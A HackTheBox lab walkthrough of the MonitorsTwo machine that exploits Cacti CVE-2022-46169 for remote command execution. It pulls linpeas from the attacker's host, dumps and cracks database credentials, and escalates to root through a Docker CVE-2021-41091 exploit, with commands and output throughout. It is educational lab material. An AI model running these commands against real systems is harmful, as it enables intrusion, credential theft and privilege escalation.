---
title: MonitorsTwo | Walkthrough
date: 2023-05-11 11:06:00 /-0500
author: anthony
categories: [Walkthroughs, HackTheBox]
tags: [hackthebox, enumeration, privilege-escalation]     # TAG names should always be lowercase
description: This post provides a walkthrough of the HackTheBox machine MonitorsTwo, including enumeration, exploiting CVE-2022-46169 for RCE, and gaining root.
image: assets/posts/monitors-two/b55987f8ef9a42df2ad4b4c096e3824d.webp
---

## Enumeration with nmap

Run nmap to determine which ports are open.

```bash
└─$ nmap -p- 10.10.11.211

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 11:06 EDT
Nmap scan report for 10.10.11.211
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
```
This tells us that there are two ports open on this machine, ports 22 (SSH) and 80 (HTTP server). If we navigate to port 80, we see a web application.

![Screenshot of Cacti Web Application with box highlighting version of Cacti.]{}
We can see that the HTTP Server is hosting something called Cacti Version 1.2.22. As it turns out, there is a CVE leading to Authenticated RCE with a POC.

## Foothold | Exploiting CVE-2022-46169 for RCE
By using this CVE-2022-46169 POC, we can test for unauthenticated RCE following the README.

### Start a python HTTP server:
```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Execute the POC with a curl command to the Python HTTP server:
```

### Execute the POC with curl command to the python http server
```bash
└─$ python3 CVE-2022-46169.py http://10.10.11.211 -c "curl http://10.10.14.86:80"
[*] Trying for 1 - 100 host ids
[+] Exploit Completed for host_id = 1
```

### Observe the GET request from the Cacti server.
This indicates we have RCE on the victim server, but we don’t know who is executing the commands yet. We could try creating a reverse shell or piping commands into a Curl POST request to receive the output.

For some reason, I wasn’t able to create a reverse shell for this machine. So instead, I created two scripts that...

### Improved Shell for CVE-2022-46169
I used ChatGPT to help me create a Python server that acts similarly to a reverse shell. The script can be found here: ImprovedShell-for-CVE-2022-46169.

```bash
└─$ python improved_server.py -t http://10.10.11.211 -ip 10.10.14.86 -port 500
CVE-2022-46169.py found in the directory.
Server listening on port 500
Enter a command to execute: curl http://10.10.14.86:50/linpeas.sh > linpeas.sh

Reponse from Victim:

Enter a command to execute: ls -la | grep lin

Reponse from Victim:
-rw-rw-r-- 1 www-data www-data   3495 Aug 14  2022 link.php
-rw-rw-r-- 1 www-data www-data  21889 Aug 14  2022 links.php
-rw-r--r-- 1 www-data www-data      0 May 12 01:33 linpeas.output
-rw-r--r-- 1 www-data www-data 830803 May 12 02:05 linpeas.sh

Enter a command to execute: bash linpeas.sh > linpeas.output
```

## User
Linpeas points out a file located at /entrypoint.sh.

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"

if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html

if [ "${1#-}" != "$1" ]; then
    set -- apache2-foreground "$@"
fi

exec "$@"
```

This script is making a connection to the MySQL database and sending the command show tables. Let's see if we can also send that command.

### Send the same command from entrypoint.sh to the database:

```bash
Enter a command to execute: mysql --host=db --user=root --password=root cacti -e 'show tables'

Reponse from Victim:
Tables_in_cacti
aggregate_graph_templates
aggregate_graph_templates_graph
aggregate_graph_templates_item
aggregate_graphs
aggregate_graphs_graph_item
aggregate_graphs_items
automation_devices
automation_graph_rule_items
automation_graph_rules
automation_ips
automation_match_rule_items
automation_networks
automation_processes
automation_snmp
automation_snmp_items
automation_templates
automation_tree_rule_items
...continued...
```

Based on the `entrypoint.sh` script, we can tell that the `user_auth` table should contain the users.

### Print everything from the `user_auth` table:
```bash
Enter a command to execute: mysql --host=db --user=root --password=root cacti -e 'select * from user_auth'

Reponse from Victim:
[auth_user table info]
```

The information returned in the _auth_user_ table can be seen below.

| id  | username | password            | full_name      | email_address          |
| --- | -------- | ------------------- | -------------- | ---------------------- |
| 1   | admin    | admin123            | Jamie Thompson | admin@monitorstwo.htb  |
| 3   | guest    | 43e9a4ab75570f5b    | Guest Account  |                        |
| 4   | marcus   | $2y$10$vcrYth5YcCLl | Marcus Brune   | marcus@monitorstwo.htb |

### Cracking the Password Hash with John the Ripper
We can assume Marcus might be the user on the victim machine, and we have his password hash.

```bash
└─$ john marcus_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:00:53 DONE (2023-05-12 00:18) 0.01866g/s 159.2p/s 159.2c/s 159.2C/s 474747..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Let's try logging into SSH with the user and password we have now.

```bash
└─$ ssh marcus@10.10.11.211   
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
...


You have mail.
Last login: Fri May 12 01:35:59 2023 from 10.10.14.27
marcus@monitorstwo:~$
```

## Root
Cool! Looks like we have mail too. It looks like we can't use the `mail` command, but we can read the mail in `/var/mail`.

```bash
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

After reading through each of the CVEs and researching them, I found that CVE-2021-41091 made the most sense. Taking the POC found here: [UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com)](https://github.com/UncleJ4ck/CVE-2021-41091) I was able to get root.

```bash
marcus@monitorstwo:/tmp$ bash exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp$
```

This didn't work but it does output what to do if the script failed.
```bash
marcus@monitorstwo:/tmp$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p -i
bash-5.1# whoami
root
```

## Takeaways

- Ensure Patching is updated
- Don’t store credentials for a database in a world-readable script
- Improve password security requirements
- Do not reuse passwords
- Following the patching recommendations more quickly, the original email was sent on October 18, 2021

Practice Defense-in-depth to reduce how far an attacker can get. 
